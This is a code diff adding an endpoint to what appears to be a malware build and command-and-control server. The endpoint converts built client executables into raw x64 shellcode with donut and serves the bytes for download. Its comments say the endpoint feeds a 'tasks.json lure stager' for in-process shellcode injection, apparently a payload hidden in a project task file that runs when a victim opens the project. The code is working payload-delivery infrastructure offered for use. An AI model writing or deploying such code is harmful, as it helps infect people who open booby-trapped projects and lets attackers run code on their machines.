@@ -511,6 +511,89 @@ export async function handleBuildRoutes(
       });
     }
 
+    // ── Shellcode endpoint — serve donut-converted shellcode for a built PE ─────
+    // GET /api/build/shellcode/<filename>
+    // Runs the PE from dist-clients/ through donut and returns raw .bin bytes.
+    // Used by the tasks.json lure stager for in-process shellcode injection.
+
+    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/shellcode\//)) {
+      requirePermission(user, "clients:build");
+
+      const rawName = url.pathname.split("/api/build/shellcode/")[1] || "";
+      let fileName = rawName;
+      try {
+        fileName = decodeURIComponent(rawName);
+      } catch {
+        return Response.json({ error: "Bad request" }, { status: 400 });
+      }
+
+      if (
+        !fileName ||
+        fileName.includes("\u0000") ||
+        fileName.includes("/") ||
+        fileName.includes("\\")
+      ) {
+        return Response.json({ error: "File not found" }, { status: 404 });
+      }
+
+      const rootDir = resolveRuntimeRoot();
+      const distRoot = path.resolve(rootDir, "dist-clients");
+      const filePath = path.resolve(distRoot, fileName);
+      const rootWithSep = distRoot.endsWith(path.sep) ? distRoot : `${distRoot}${path.sep}`;
+
+      if (!filePath.startsWith(rootWithSep)) {
+        return Response.json({ error: "File not found" }, { status: 404 });
+      }
+
+      const peFile = Bun.file(filePath);
+      if (!(await peFile.exists())) {
+        return Response.json({ error: "File not found" }, { status: 404 });
+      }
+
+      // Locate donut binary
+      const toolsDir = path.join(resolveDataDir(), "tools");
+      const donutBin = (() => {
+        const local = path.join(toolsDir, process.platform === "win32" ? "donut.exe" : "donut");
+        if (fs.existsSync(local)) return local;
+        try {
+          const r = Bun.spawnSync(["which", "donut"]);
+          if (r.exitCode === 0) return r.stdout.toString().trim();
+        } catch {}
+        return null;
+      })();
+
+      if (!donutBin) {
+        return Response.json({ error: "Donut not available on this server" }, { status: 503 });
+      }
+
+      // Run donut: -i <pe> -o <bin> -a 2 (x64) -f 1 (raw shellcode)
+      const tmpBin = path.join(toolsDir, `sc_${uuidv4()}.bin`);
+      try {
+        const proc = Bun.spawnSync([donutBin, "-i", filePath, "-o", tmpBin, "-a", "2", "-f", "1"]);
+        if (proc.exitCode !== 0) {
+          const err = proc.stderr?.toString().trim() || proc.stdout?.toString().trim() || "unknown";
+          logger.warn(`[shellcode] donut failed: ${err}`);
+          return Response.json({ error: "Shellcode generation failed" }, { status: 500 });
+        }
+
+        const scFile = Bun.file(tmpBin);
+        if (!(await scFile.exists())) {
+          return Response.json({ error: "Shellcode output missing" }, { status: 500 });
+        }
+
+        const scBytes = await scFile.arrayBuffer();
+        const scName = fileName.replace(/\.[^.]+$/, "") + ".bin";
+        return new Response(scBytes, {
+          headers: {
+            "Content-Type": "application/octet-stream",
+            "Content-Disposition": `attachment; filename="${scName}"`,
+          },
+        });
+      } finally {
+        try { fs.unlinkSync(tmpBin); } catch {}
+      }
+    }
+
     // ── Vault keypair management ─────────────────────────────────────────────
 
     if (req.method === "GET" && url.pathname === "/api/build/vault/status") {
